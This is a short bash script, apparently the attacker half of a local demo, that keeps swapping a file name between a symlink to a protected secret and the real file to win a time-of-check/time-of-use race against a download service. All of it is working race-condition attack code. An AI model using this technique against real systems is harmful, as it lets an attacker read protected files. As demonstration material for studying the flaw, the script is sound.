#!/usr/bin/env bash
set -euo pipefail

BASE="/tmp/secure-downloads-demo"
SECRET="/tmp/protected/secret.txt"
REAL_SRC="$BASE/target-real-source"   # permanent source
DEPLOY_NAME="target.txt"
TARGET="$BASE/$DEPLOY_NAME"
TMP_REAL="$BASE/._real_tmp"
LOG="$BASE/attacker.log"

# tuning (ms)
ATT_MS=250   # how long symlink to secret stays in place (increase to make demo easier)
REST_MS=150  # how long real stays in place

# sanity
mkdir -p "$BASE" /tmp/protected
[ -f "$REAL_SRC" ] || echo "NORMAL_CONTENT" > "$REAL_SRC"
[ -f "$SECRET" ]   || echo "TOP_SECRET: do-not-share" > "$SECRET"
[ -f "$TARGET" ]   || ln "$REAL_SRC" "$TARGET"

att_s=$(awk "BEGIN{printf \"%.3f\", $ATT_MS/1000}")
rest_s=$(awk "BEGIN{printf \"%.3f\", $REST_MS/1000}")

echo "Starting attacker loop; log -> $LOG"
echo "ATT_MS=$ATT_MS REST_MS=$REST_MS" > "$LOG"

while true; do
  # place symlink at the deployed name pointing at the protected secret (atomic on most Unixes)
  ln -sfn "$SECRET" "$TARGET"
  echo "$(date '+%T.%3N') ATTACKER: symlink -> $SECRET (inode $(stat -c %i "$TARGET" 2>/dev/null || echo ?))" | tee -a "$LOG"

  sleep "$att_s"

  # restore real without consuming REAL_SRC: create a temporary hardlink to REAL_SRC then mv it into place
  ln "$REAL_SRC" "$TMP_REAL"
  mv -f "$TMP_REAL" "$TARGET"
  echo "$(date '+%T.%3N') ATTACKER: restored real (inode $(stat -c %i "$TARGET" 2>/dev/null || echo ?))" | tee -a "$LOG"

  sleep "$rest_s"
done
